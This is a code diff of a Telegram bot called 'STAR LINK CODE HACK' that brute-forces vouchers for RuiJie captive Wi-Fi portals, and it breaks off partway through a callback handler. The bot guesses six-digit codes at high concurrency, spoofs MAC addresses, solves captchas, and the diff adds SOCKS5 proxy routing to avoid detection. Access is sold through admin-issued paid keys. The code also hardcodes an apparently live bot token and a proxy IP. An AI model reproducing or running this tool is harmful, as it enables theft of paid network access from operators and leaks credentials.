@@ -5,7 +5,7 @@ STAR LINK CODE HACK — Professional Edition
 Production-grade RuiJie captive-portal voucher scanner.
 
 Author  : God-tier refactor
-Version : 3.0.0 (Full Fixed + Random Fix + Optimized)
+Version : 4.0.0 (Final — Proxy + True Random + Optimized)
 """
 from __future__ import annotations
 
@@ -30,15 +30,21 @@ import cv2
 import ddddocr
 import numpy as np
 from aiohttp import web
+from aiohttp_socks import ProxyConnector
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 # ============================================================
 # CONFIGURATION
 # ============================================================
-BOT_TOKEN: str = "8706721477:AAGEZEbKBfI2gBHi6taWj1ToH2-EStFF6HI"
-ADMINS: Tuple[str, ...] = ("8797803204",)
-ADMIN_USERNAME: str = "@Nytheris_q"
+BOT_TOKEN: str = os.environ.get(
+    "BOT_TOKEN",
+    "8706721477:AAGEZEbKBfI2gBHi6taWj1ToH2-EStFF6HI"
+)
+ADMINS: Tuple[str, ...] = tuple(
+    os.environ.get("ADMINS", "8797803204").split(",")
+)
+ADMIN_USERNAME: str = os.environ.get("ADMIN_USERNAME", "@Nytheris_q")
 
 DB_PATH: str = os.environ.get("DB_PATH", "bot_data.db")
 WEB_PORT: int = int(
@@ -47,9 +53,9 @@ WEB_PORT: int = int(
     or "8099"
 )
 
-MAX_CONCURRENT_SCANS: int = 100
-CONCURRENCY: int = 1000
-BATCH_SIZE: int = 500
+MAX_CONCURRENT_SCANS: int = int(os.environ.get("MAX_CONCURRENT_SCANS", "100"))
+CONCURRENCY: int = int(os.environ.get("CONCURRENCY", "1000"))
+BATCH_SIZE: int = int(os.environ.get("BATCH_SIZE", "500"))
 KEY_RECHECK_INTERVAL: float = 600.0
 
 SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS
@@ -57,8 +63,14 @@ SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS
 # ============================================================
 # PROXY CONFIGURATION
 # ============================================================
-PROXY_ENABLED: bool = False
-PROXY_LIST: List[str] = []
+# Proxy သုံးမလား? (VPS မှာ Dante Server ရှိမှ True လုပ်ပါ)
+PROXY_ENABLED: bool = os.environ.get("PROXY_ENABLED", "false").lower() == "true"
+
+# SOCKS5 Proxy URL
+PROXY_URL: str = os.environ.get(
+    "PROXY_URL",
+    "socks5://15.135.92.58:1080"
+)
 
 # ============================================================
 # LOGGING
@@ -76,10 +88,44 @@ def setup_logging() -> None:
 log = logging.getLogger("starlink")
 
 # ============================================================
+# PROXY CONNECTOR FACTORY
+# ============================================================
+def make_proxy_connector() -> Optional[ProxyConnector]:
+    """SOCKS5 Proxy အတွက် Connector ဖန်တီးတယ်။"""
+    if not PROXY_ENABLED:
+        return None
+    try:
+        return ProxyConnector.from_url(PROXY_URL, ssl=False)
+    except Exception as e:
+        log.warning("Failed to create proxy connector: %s", e)
+        return None
+
+
+def make_direct_connector() -> aiohttp.TCPConnector:
+    """Proxy မပါဘဲ တိုက်ရိုက် ချိတ်ဆက်တဲ့ Connector။"""
+    return aiohttp.TCPConnector(
+        limit=20000,
+        limit_per_host=10000,
+        ttl_dns_cache=300,
+        ssl=False,
+    )
+
+
+def get_connector():
+    """Proxy ရှိရင် Proxy Connector၊ မရှိရင် Direct Connector ပြန်ပေး။"""
+    if PROXY_ENABLED:
+        conn = make_proxy_connector()
+        if conn is not None:
+            return conn
+    return make_direct_connector()
+
+
+# ============================================================
 # DATABASE
 # ============================================================
 _db_conn: Optional[sqlite3.Connection] = None
 _db_lock = asyncio.Lock()
+
 
 def _get_conn() -> sqlite3.Connection:
     global _db_conn
@@ -108,15 +154,20 @@ def _get_conn() -> sqlite3.Connection:
         log.info("Database ready (%s)", DB_PATH)
     return _db_conn
 
+
 async def _db_run(fn, *args):
     async with _db_lock:
         return await asyncio.to_thread(fn, *args)
 
+
 def _sync_get_auth_list() -> Dict[str, Dict[str, Any]]:
     c = _get_conn().cursor()
     c.execute("SELECT * FROM auth_list")
-    return {r["user_id"]: {"expires_at": r["expires_at"], "plan": r["plan"]}
-            for r in c.fetchall()}
+    return {
+        r["user_id"]: {"expires_at": r["expires_at"], "plan": r["plan"]}
+        for r in c.fetchall()
+    }
+
 
 def _sync_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
     conn = _get_conn()
@@ -126,24 +177,33 @@ def _sync_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
     )
     conn.commit()
 
+
 def _sync_delete_key(user_id: str) -> None:
     conn = _get_conn()
     conn.execute("DELETE FROM auth_list WHERE user_id = ?", (user_id,))
     conn.commit()
 
+
 async def db_get_auth_list() -> Dict[str, Dict[str, Any]]:
     return await _db_run(_sync_get_auth_list)
+
 
 async def db_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
     await _db_run(_sync_upsert_key, user_id, expires_at, plan)
 
+
 async def db_delete_key(user_id: str) -> None:
     await _db_run(_sync_delete_key, user_id)
 
+
 def _sync_get_results(user_id: str) -> List[str]:
     c = _get_conn().cursor()
-    c.execute("SELECT code FROM results WHERE user_id = ? ORDER BY rowid ASC", (user_id,))
+    c.execute(
+        "SELECT code FROM results WHERE user_id = ? ORDER BY rowid ASC",
+        (user_id,),
+    )
     return [r["code"] for r in c.fetchall()]
+
 
 def _sync_add_result(user_id: str, code: str, plan: str = "") -> None:
     conn = _get_conn()
@@ -152,6 +212,7 @@ def _sync_add_result(user_id: str, code: str, plan: str = "") -> None:
         (user_id, code, plan),
     )
     conn.commit()
+
 
 def _sync_set_results(user_id: str, codes: List[str]) -> None:
     conn = _get_conn()
@@ -163,14 +224,18 @@ def _sync_set_results(user_id: str, codes: List[str]) -> None:
         )
     conn.commit()
 
+
 async def db_get_results(user_id: str) -> List[str]:
     return await _db_run(_sync_get_results, user_id)
+
 
 async def db_add_result(user_id: str, code: str, plan: str = "") -> None:
     await _db_run(_sync_add_result, user_id, code, plan)
 
+
 async def db_set_results(user_id: str, codes: List[str]) -> None:
     await _db_run(_sync_set_results, user_id, codes)
+
 
 # ============================================================
 # GLOBAL STATE
@@ -194,6 +259,7 @@ _start_time: float = time.monotonic()
 session: Optional[aiohttp.ClientSession] = None
 _connector: Optional[aiohttp.TCPConnector] = None
 
+
 # ============================================================
 # SEMAPHORE / SCAN-SLOT
 # ============================================================
@@ -205,6 +271,7 @@ async def get_voucher_sem() -> asyncio.Semaphore:
                 _voucher_sem = asyncio.Semaphore(CONCURRENCY)
     return _voucher_sem
 
+
 async def acquire_scan_slot() -> bool:
     global active_scans_count
     async with active_scans_lock:
@@ -213,10 +280,12 @@ async def acquire_scan_slot() -> bool:
         active_scans_count += 1
         return True
 
+
 async def release_scan_slot() -> None:
     global active_scans_count
     async with active_scans_lock:
         active_scans_count = max(0, active_scans_count - 1)
+
 
 def cleanup_scan_state(chat_id: int) -> None:
     scan_tasks.pop(chat_id, None)
@@ -227,11 +296,13 @@ def cleanup_scan_state(chat_id: int) -> None:
     if chat_id in user_data:
         user_data[chat_id].pop("current_display_codes", None)
 
+
 # ============================================================
 # HELPERS
 # ============================================================
 def is_admin(user_id: int | str) -> bool:
     return str(user_id) in ADMINS
+
 
 def check_key_expiration(data: Any) -> bool:
     try:
@@ -246,15 +317,16 @@ def check_key_expiration(data: Any) -> bool:
         log.warning("Key parse error: %s", e)
         return False
 
+
 def generate_expiry(plan: str) -> Optional[str]:
     now = datetime.now(timezone.utc)
     table = {
         "30m": timedelta(minutes=30),
-        "1h":  timedelta(hours=1),
-        "1d":  timedelta(days=1),
-        "7d":  timedelta(days=7),
-        "1m":  timedelta(days=30),
-        "1y":  timedelta(days=365),
+        "1h": timedelta(hours=1),
+        "1d": timedelta(days=1),
+        "7d": timedelta(days=7),
+        "1m": timedelta(days=30),
+        "1y": timedelta(days=365),
         "unlimited": None,
     }
     if plan not in table:
@@ -263,13 +335,16 @@ def generate_expiry(plan: str) -> Optional[str]:
         return "9999-12-31T23:59:59Z"
     return (now + table[plan]).isoformat()
 
+
 def get_mac() -> str:
     first = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [first] + [random.randint(0, 0xFF) for _ in range(5)]
     return ":".join(f"{x:02x}" for x in mac)
 
+
 def replace_mac(url: str, new_mac: str) -> str:
     return re.sub(r"(?<=mac=)[^&]+", new_mac, url)
+
 
 def minute_to_hour(total_minutes: Any) -> str:
     if total_minutes in (None, "Unknown", "unknown"):
@@ -287,10 +362,12 @@ def minute_to_hour(total_minutes: Any) -> str:
     except Exception:
         return "Unknown"
 
+
 # ============================================================
 # BOT SETUP
 # ============================================================
 bot = AsyncTeleBot(BOT_TOKEN)
+
 
 # ============================================================
 # KEYBOARDS
@@ -299,13 +376,14 @@ def get_main_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
-        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
-        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
-        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
+        InlineKeyboardButton("🔗 Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
+        InlineKeyboardButton("📋 Success Codes", callback_data="menu_result"),
+        InlineKeyboardButton("🔄 Recheck", callback_data="menu_recheck"),
         InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
         InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
     )
     return kb
+
 
 def get_voucher_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=2)
@@ -324,14 +402,27 @@ def get_voucher_keyboard() -> InlineKeyboardMarkup:
     )
     return kb
 
+
 def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=5)
-    btns = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
+    btns = [
+        InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}")
+        for i in range(10)
+    ]
     kb.add(*btns)
-    kb.add(InlineKeyboardButton("🎲 Random (တကယ် Random)", callback_data=f"digit_{mode}_random"))
-    kb.add(InlineKeyboardButton("🔢 Sequential 000000-999999", callback_data=f"digit_{mode}_seq"))
+    kb.add(
+        InlineKeyboardButton(
+            "🎲 Random (တကယ် Random)", callback_data=f"digit_{mode}_random"
+        )
+    )
+    kb.add(
+        InlineKeyboardButton(
+            "🔢 Sequential (000000-999999)", callback_data=f"digit_{mode}_seq"
+        )
+    )
     kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
     return kb
+
 
 def get_start_scam_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
@@ -341,6 +432,7 @@ def get_start_scam_keyboard() -> InlineKeyboardMarkup:
     )
     return kb
 
+
 def get_paid_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
     kb.add(
@@ -349,10 +441,12 @@ def get_paid_keyboard() -> InlineKeyboardMarkup:
     )
     return kb
 
+
 def get_back_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
     kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
     return kb
+
 
 def get_scam_button_keyboard() -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup(row_width=1)
@@ -361,6 +455,7 @@ def get_scam_button_keyboard() -> InlineKeyboardMarkup:
         InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
     )
     return kb
+
 
 # ============================================================
 # STATE LOADER
@@ -381,6 +476,7 @@ async def load_paid_users() -> None:
             continue
     log.info("Preloaded %d paid users", len(paid_users))
 
+
 async def is_paid(user_id: str) -> bool:
     if is_admin(user_id):
         return True
@@ -393,11 +489,16 @@ async def is_paid(user_id: str) -> bool:
         return False
     return False
 
+
 # ============================================================
 # MESSAGE EDIT HELPERS
 # ============================================================
-async def safe_edit_text(chat_id: int, message_id: int, text: str,
-                         reply_markup: Optional[InlineKeyboardMarkup] = None) -> bool:
+async def safe_edit_text(
+    chat_id: int,
+    message_id: int,
+    text: str,
+    reply_markup: Optional[InlineKeyboardMarkup] = None,
+) -> bool:
     try:
         await bot.edit_message_text(
             text=text,
@@ -410,9 +511,13 @@ async def safe_edit_text(chat_id: int, message_id: int, text: str,
         log.debug("edit_message_text failed: %s", e)
         return False
 
-async def safe_send(chat_id: int, text: str,
-                    reply_markup: Optional[InlineKeyboardMarkup] = None,
-                    parse_mode: Optional[str] = None) -> bool:
+
+async def safe_send(
+    chat_id: int,
+    text: str,
+    reply_markup: Optional[InlineKeyboardMarkup] = None,
+    parse_mode: Optional[str] = None,
+) -> bool:
     try:
         await bot.send_message(
             chat_id=chat_id,
@@ -424,6 +529,7 @@ async def safe_send(chat_id: int, text: str,
     except Exception as e:
         log.debug("send_message failed: %s", e)
         return False
+
 
 # ============================================================
 # COMMAND HANDLERS
@@ -442,21 +548,20 @@ async def cmd_start(message):
             "✨ STAR LINK CODE HACK ✨\n\n"
             f"🪪 NAME: {user_name}\n"
             f"📜 USER ID: {user_id}\n\n"
-            "🎁 မင်္ဂလာပါခင်ဗျာ!\n"
-            "🎫 သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n"
-            "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n\n"
-            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
+            "🎁 PAID USER - Unlimited Access\n\n"
+            "အောက်ပါ Menu မှ ရွေးချယ်ပါ။"
         )
     else:
         welcome = (
             "✨ STAR LINK CODE HACK ✨\n\n"
             f"🪪 NAME: {user_name}\n"
             f"📜 USER ID: {user_id}\n\n"
-            "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            "PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
+            "⚠️ User ID ကို registered မလုပ်ရသေးပါ။\n\n"
+            "PAID USER ဖြစ်ရန် Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
             f"👨‍💻 Admin: {ADMIN_USERNAME}"
         )
     await safe_send(chat_id, welcome, reply_markup=get_main_keyboard())
+
 
 @bot.message_handler(commands=["sendall"])
 async def cmd_sendall(message):
@@ -477,6 +582,7 @@ async def cmd_sendall(message):
         except Exception:
             failed += 1
     await bot.reply_to(message, f"✅ Sent: {sent} | ❌ Failed: {failed}")
+
 
 @bot.message_handler(commands=["key"])
 async def cmd_key(message):
@@ -500,17 +606,17 @@ async def cmd_key(message):
         user_data.setdefault(message.chat.id, {})
         await bot.reply_to(
             message,
-            f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\n"
-            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
+            f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}",
         )
     elif target_uid:
         await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
     else:
         await bot.reply_to(
             message,
-            f"❌ Key ကို registered မလုပ်ရသေးပါ။\n\nUSER ID: {user_id}\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"❌ Key ကို registered မလုပ်ရသေးပါ။\n\n"
+            f"Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
         )
+
 
 @bot.message_handler(commands=["genkey"])
 async def cmd_genkey(message):
@@ -519,7 +625,10 @@ async def cmd_genkey(message):
         return
     args = message.text.split()
     if len(args) < 3:
-        await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id>\nPlans: 30m|1h|1d|7d|1m|1y|unlimited")
+        await bot.reply_to(
+            message,
+            "Usage:\n/genkey <plan> <user_id>\nPlans: 30m|1h|1d|7d|1m|1y|unlimited",
+        )
         return
     plan, user_id = args[1], args[2]
     if not user_id.isdigit():
@@ -537,6 +646,7 @@ async def cmd_genkey(message):
         f"✅ Key Generated\n\nUSER ID : {user_id}\nPLAN    : {plan}\nEXPIRES : {expiry}",
     )
     log.info("genkey %s plan=%s by admin %s", user_id, plan, message.chat.id)
+
 
 @bot.message_handler(commands=["delkey"])
 async def cmd_delkey(message):
@@ -557,6 +667,7 @@ async def cmd_delkey(message):
     if user_id.isdigit():
         user_data.pop(int(user_id), None)
     await bot.reply_to(message, f"✅ Key Deleted\nUSER ID : {user_id}")
+
 
 @bot.message_handler(commands=["listkeys"])
 async def cmd_listkeys(message):
@@ -595,19 +706,19 @@ async def cmd_listkeys(message):
         for i in range(0, len(text), 4096):
             await bot.send_message(message.chat.id, text[i : i + 4096])
 
+
 @bot.message_handler(commands=["result"])
 async def cmd_result(message):
     user_id = str(message.chat.id)
     if not await is_paid(user_id):
         await bot.reply_to(
             message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
         )
         return
     results = await db_get_results(user_id)
     if not results:
-        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
+        await bot.reply_to(message, "သင့်တွင် code မရှိသေးပါ။")
         return
     body = "✅ Found Codes:\n" + "\n".join(results)
     if len(body) <= 4096:
@@ -616,14 +727,14 @@ async def cmd_result(message):
         for i in range(0, len(body), 4096):
             await bot.send_message(message.chat.id, body[i : i + 4096])
 
+
 @bot.message_handler(commands=["portal"])
 async def cmd_portal(message):
     user_id = str(message.chat.id)
     if not await is_paid(user_id):
         await bot.reply_to(
             message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
         )
         return
     args = message.text.split(maxsplit=1)
@@ -645,17 +756,18 @@ async def cmd_portal(message):
         user_data[message.chat.id]["session_url"] = url
         await bot.reply_to(
             message,
-            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
+            "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
             reply_markup=get_voucher_keyboard(),
         )
     else:
         await bot.reply_to(
             message,
-            "❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်စစ်ပါ။\n\n"
+            "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်စစ်ပါ။\n\n"
             "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
             "`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
             parse_mode="Markdown",
         )
+
 
 @bot.message_handler(commands=["scan"])
 async def cmd_scan(message):
@@ -671,15 +783,16 @@ async def cmd_scan(message):
     mode = args[1].strip()
     await _start_scan(message.chat.id, mode, message=message)
 
-async def _start_scan(chat_id: int, mode: str, message=None,
-                      user_name: Optional[str] = None) -> bool:
+
+async def _start_scan(
+    chat_id: int, mode: str, message=None, user_name: Optional[str] = None
+) -> bool:
     user_id = str(chat_id)
 
     if not await is_paid(user_id):
         await safe_send(
             chat_id,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
         )
         return False
 
@@ -693,7 +806,7 @@ async def _start_scan(chat_id: int, mode: str, message=None,
         return False
 
     try:
-        test_iter = iter_codes(mode, start_digit=None)
+        test_iter = iter_codes(mode, start_digit=None, random_mode=True)
         try:
             next(test_iter)
         except StopIteration:
@@ -728,11 +841,13 @@ async def _start_scan(chat_id: int, mode: str, message=None,
         portal_url = user_data[chat_id].get("session_url", "Unknown")
         last_url = user_data[chat_id].get("last_admin_notified_url", "")
         if portal_url != last_url and portal_url != "Unknown":
+            proxy_tag = "🌐 Proxy: ON" if PROXY_ENABLED else "🌐 Proxy: OFF"
             admin_msg = (
                 "🚀 Scan Start\n\n"
                 f"🪪 User: {user_name}\n"
                 f"📜 User ID: {user_id}\n"
                 f"🔢 Mode: {mode}\n"
+                f"{proxy_tag}\n"
                 f"🔗 URL: {portal_url}"
             )
             for admin_id in ADMINS:
@@ -756,6 +871,7 @@ async def _start_scan(chat_id: int, mode: str, message=None,
     scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
     return True
 
+
 @bot.message_handler(commands=["stop"])
 async def cmd_stop(message):
     chat_id = message.chat.id
@@ -766,9 +882,12 @@ async def cmd_stop(message):
         await _send_success_file(chat_id)
         data["task"].cancel()
         cleanup_scan_state(chat_id)
-        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
+        await bot.reply_to(
+            message, "🛑 Scan ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard()
+        )
     else:
         await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())
+
 
 @bot.message_handler(commands=["status"])
 async def cmd_status(message):
@@ -779,7 +898,7 @@ async def cmd_status(message):
     uptime = int(time.monotonic() - _start_time)
     h, rem = divmod(uptime, 3600)
     m, s = divmod(rem, 60)
-    proxy_status = "ENABLED" if PROXY_ENABLED else "DISABLED"
+    proxy_status = f"ENABLED ({PROXY_URL})" if PROXY_ENABLED else "DISABLED"
     await bot.reply_to(
         message,
         f"🪫 Bot Status\n\n"
@@ -790,6 +909,7 @@ async def cmd_status(message):
         f"🌐 Proxy: {proxy_status}",
     )
 
+
 @bot.message_handler(commands=["recheck"])
 async def cmd_recheck(message):
     chat_id = message.chat.id
@@ -797,8 +917,7 @@ async def cmd_recheck(message):
     if not await is_paid(user_id):
         await bot.reply_to(
             message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+            f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
         )
         return
     if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
@@ -807,7 +926,7 @@ async def cmd_recheck(message):
 
     results = await db_get_results(user_id)
     if not results:
-        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
+        await bot.reply_to(message, "သင့်တွင် success code မရှိသေးပါ။")
         return
 
     await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
@@ -819,9 +938,14 @@ async def cmd_recheck(message):
         )
         if recode:
             recheck_list.append(recode)
-    body = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ပြီး success code မတွေ့ပါ။"
+    body = (
+        "\n".join(recheck_list)
+        if recheck_list
+        else "Code များအားလုံးစစ်ပြီး success code မတွေ့ပါ။"
+    )
     await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{body}")
     await db_set_results(user_id, recheck_list)
+
 
 # ============================================================
 # CALLBACK HANDLER
@@ -845,39 +969,41 @@ async def on_callback(call):
                 text = (
                     "✨ STAR LINK CODE HACK ✨\n\n"
                     f"🪪 NAME: {user_name}\n📜 USER ID: {user_id}\n\n"
-                    "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
+                    "⚠️ registered မလုပ်ရသေးပါ။\n\n"
                     "PAID USER ဖြစ်ရန် PAID USER ကိုနှိပ်ပါ။"
                 )
-            await safe_edit_text(chat_id, call.message.message_id, text, get_main_keyboard())
+            await safe_edit_text(
+                chat_id, call.message.message_id, text, get_main_keyboard()
+            )
             return
 
         if data == "menu_free_trial":
             if not await is_paid(user_id):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
-                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
-                    f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id,
+                    call.message.message_id,
+                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                     get_back_keyboard(),
                 )
                 return
             await safe_edit_text(
-                chat_id, call.message.message_id,
-                "🔗 Portal URL ထည့်သွင်းရန်:\n\n"
+                chat_id,
+                call.message.message_id,
+                "🔗 Portal URL ထည့်ရန်:\n\n"
                 "/portal [your_portal_url]\n\n"
                 "ဥပမာ:\n"
-                "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00\n\n"
-                "Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်။",
+                "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
                 get_back_keyboard(),
             )
             return
 
         if data == "menu_paid":
             await safe_edit_text(
-                chat_id, call.message.message_id,
+                chat_id,
+                call.message.message_id,
                 "🔑 PAID USER ဖြစ်ရန်\n\n"
-                "ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်ပါ။\n\n"
                 f"USER ID: {user_id}\n\n"
-                f"✅ USER ID ကို Admin ထံပေးပြီး Key ဝယ်ပါ။\n"
+                f"USER ID ကို Admin ထံပေးပြီး Key ဝယ်ပါ။\n"
                 f"👨‍💻 Admin: {ADMIN_USERNAME}\n\n"
                 "Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ",
                 get_paid_keyboard(),
@@ -890,14 +1016,16 @@ async def on_callback(call):
                 paid_users.add(user_id)
                 user_data.setdefault(chat_id, {})
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
-                    f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nMenu မှ ရွေးချယ်ပါ။",
+                    chat_id,
+                    call.message.message_id,
+                    f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}",
                     get_main_keyboard(),
                 )
             elif user_id in auth:
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
-                    f"❌ Key Expired ဖြစ်နေပါသည်။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id,
+                    call.message.message_id,
+                    f"❌ Key Expired။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                     get_back_keyboard(),
                 )
             else:
@@ -908,9 +1036,10 @@ async def on_callback(call):
                         f"To approve:\n/genkey unlimited {user_id}",
                     )
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
-                    f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ပါ။\n\nUSER ID: {user_id}\n\n"
-                    f"Admin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
+                    chat_id,
+                    call.message.message_id,
+                    f"🙏 Paid ဝယ်ပါ။\n\nUSER ID: {user_id}\n\n"
+                    f"Admin မှ အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n"
                     f"👨‍💻 Admin: {ADMIN_USERNAME}",
                     get_back_keyboard(),
                 )
@@ -919,35 +1048,45 @@ async def on_callback(call):
         if data == "menu_result":
             if not await is_paid(user_id):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
-                    f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nAdmin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
+                    chat_id,
+                    call.message.message_id,
+                    f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                     get_back_keyboard(),
                 )
                 return
             results = await db_get_results(user_id)
-            text = ("✅ Found Codes:\n" + "\n".join(results)) if results else "📋 Success code မရှိသေးပါ။"
+            text = (
+                ("✅ Found Codes:\n" + "\n".join(results))
+                if results
+                else "📋 Success code မရှိသေးပါ။"
+            )
             if len(text) > 4096:
                 text = text[:4093] + "..."
-            await safe_edit_text(chat_id, call.message.message_id, text, get_back_keyboard())
+            await safe_edit_text(
+                chat_id, call.message.message_id, text, get_back_keyboard()
+            )
             return
 
         if data == "menu_recheck":
             if not await is_paid(user_id):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
+                    chat_id,
+                    call.message.message_id,
                     f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                     get_back_keyboard(),
                 )
                 return
             if chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
+                    chat_id,
+                    call.message.message_id,
                     "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
                     get_back_keyboard(),
                 )
                 return
             await safe_edit_text(
-                chat_id, call.message.message_id,
+                chat_id,
+                call.message.message_id,
                 "🔄 Recheck စတင်နေပါသည်...",
                 get_scam_button_keyboard(),
             )
@@ -978,7 +1117,8 @@ async def on_callback(call):
         if data.startswith("scan_"):
             if not await is_paid(user_id):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
+                    chat_id,
+                    call.message.message_id,
